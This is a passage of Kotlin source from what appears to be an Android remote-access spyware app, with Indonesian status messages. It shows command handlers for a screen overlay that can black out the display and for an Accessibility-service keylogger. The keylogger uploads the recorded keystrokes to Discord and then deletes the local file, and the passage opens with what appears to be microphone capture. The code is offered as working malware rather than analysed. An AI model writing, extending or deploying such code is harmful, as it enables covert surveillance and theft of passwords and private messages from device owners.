        }, "mic").start()
    }

    // ---------------------------------------------------------------- overlay

    private fun overlay(arg: String, black: Boolean) {
        val label = if (black) "BLACK" else "BLOCK"
        val a = arg.trim().lowercase()
        val on = a.isEmpty() || a == "on" || a == "1"
        if (!on) {
            Overlay.hide(this)
            say("$label=off")
            return
        }
        if (!Overlay.canDraw(this)) {
            say("ERR izin 'tampil di atas aplikasi lain' belum ada — buka app lalu izinkan")
            return
        }
        say(if (Overlay.show(this, black)) "$label=on" else "ERR overlay gagal dipasang")
    }

    // ---------------------------------------------------------------- keylog

    private fun keylog(arg: String) {
        when (arg.trim().lowercase()) {
            "on" -> {
                KeylogService.enabled = true
                if (KeylogService.isEnabled(this)) {
                    say("KEYLOG=on")
                } else {
                    say(
                        "KEYLOG belum aktif di sistem. Accessibility cuma bisa " +
                            "dinyalakan pemilik perangkat — membuka Settings"
                    )
                    try {
                        startActivity(
                            Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        )
                    } catch (_: Exception) {
                    }
                }
            }

            "off" -> {
                KeylogService.enabled = false
                say("KEYLOG=off (service tetap terpasang, berhenti mencatat)")
            }

            "clear" -> {
                KeylogService.clear(this)
                say("KEYLOG cleared")
            }

            else -> {
                val f = KeylogService.file(this)
                if (!f.exists() || f.length() == 0L) {
                    say("KEYLOG kosong")
                    return
                }
                val ok = Discord.upload(f, tag + "keylog " + f.length() + " B")
                say(if (ok) "KEYLOG terkirim (${f.length()} B)" else "KEYLOG_GAGAL")
                if (ok) f.delete()
            }
        }
    }
}
